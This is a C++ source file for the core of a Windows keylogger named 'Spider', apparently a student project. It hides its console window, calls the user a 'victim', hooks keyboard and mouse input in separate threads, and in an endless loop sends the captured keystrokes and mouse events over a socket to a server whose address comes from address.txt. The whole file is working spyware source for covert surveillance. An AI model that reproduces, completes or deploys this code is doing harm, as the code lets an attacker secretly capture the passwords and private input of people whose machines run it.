#include "core.h"
#include "socketManager.h"
#include "eventReceiver.h"
#include "spider.h"
#include <Windows.h>
#include <thread>
#include "sendData.h"

core::core()
{
}

core::~core()
{
}

int		core::init()
{
	eventReceiver	victim;

	invisibleSpider();
	if (infoConnection() == SPIDER_ERR)
		return (SPIDER_ERR);
	std::thread key(&eventReceiver::hookKey, victim);
	std::thread mouse(&eventReceiver::hookMouse, victim);
	connectServer();
	key.join();
	mouse.join();
	return (SPIDER_OK);
}

void	core::connectServer()
{
	socketManager	socketManager(address.c_str(), port.c_str());
	sendData data;

	while (42)
	{
		socketManager.initConnect();
		while (socketManager.isConnected() == true)
		{
			try {
				if (data.sendKey() == SPIDER_OK)
				{
					data.printData(KEYBOARD_DATA);
					socketManager.sendSocket(data.getKeyData());
				}
				if (data.sendMouse() == SPIDER_OK)
				{
					data.printData(MOUSE_DATA);
					socketManager.sendSocket(data.getMouseData());
				}
			}
			catch (std::exception const& ex)
			{
				std::cout << "Disconnected from the server:" << ex.what() << std::endl;
				socketManager.setIsConnected(false);
			}
		}
	}
}

int		core::infoConnection()
{
	std::ifstream	infoFile;
	std::string		line;

	infoFile.open("address.txt");
	if (!infoFile.is_open())
	{
		std::cerr << "File address.txt not found" << std::endl;
		return (SPIDER_ERR);
	}
	if (std::getline(infoFile, line, ' '))
	{
		address = line;
		if (std::getline(infoFile, line, ' '))
			port = line;
	}
	std::cout << "Address : " << address << " | Port : " << port << std::endl;
	return (SPIDER_OK);
}

int		core::invisibleSpider()
{
	HWND stealth;

	AllocConsole();
	stealth = FindWindow("consoleWindowClass", NULL);
	// TURN 1 to 0 for invisible program
	ShowWindow(stealth, 0);
	return (SPIDER_OK);
}
